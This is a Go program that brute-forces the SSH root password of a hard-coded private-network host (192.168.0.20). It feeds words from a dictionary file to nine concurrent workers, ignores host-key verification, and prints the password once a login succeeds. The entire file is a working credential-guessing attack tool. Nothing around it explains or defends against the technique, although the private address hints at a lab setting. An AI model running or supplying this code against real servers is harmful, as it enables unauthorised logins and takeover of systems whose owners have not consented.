package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"os"
	"sync"
	"time"
)

const numWorkers = 9
const sshHost = "192.168.0.20"

//const loopbackIp = "127.0.0.1"

var wg sync.WaitGroup

func main() {
	success := make(chan string, 1)

	done := make(chan bool)

	words := make(chan string)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerId int) {
			for w := range words {
				//fmt.Printf("word attempt: %v", w)
				result := tryPassword(sshHost, "root", w)
				if result != "" {
					success <- w
					break
				}
			}
			fmt.Printf("worker %v terminated\n", workerId)
			wg.Done()
		}(i)
	}

	go func() {
		file, err := os.Open("words_alpha.txt")
		if err != nil {
			log.Fatal(err)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		scanner.Split(bufio.ScanWords)
	L:
		for scanner.Scan() {
			select {
			case <-done:
				break L
			default:
				w := scanner.Text()
				words <- w
			}
		}
		if err := scanner.Err(); err != nil {
			log.Fatal(err)
		}
		close(words)
		fmt.Println("producer terminated")
	}()

	fmt.Printf("The root password is: %v\n", <-success)
	done <- true
	wg.Wait()

	fmt.Println("main thread terminated")
}

func tryPassword(hostIpAddress, username, sshPassword string) string {
	config := &ssh.ClientConfig{
		Timeout:         time.Second,
		User:            username,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(sshPassword)},
	}
	addr := fmt.Sprintf("%s:%d", hostIpAddress, 22)
	_, err := ssh.Dial("tcp", addr, config)
	if err == nil {
		return sshPassword
	} else {
		return ""
	}
}
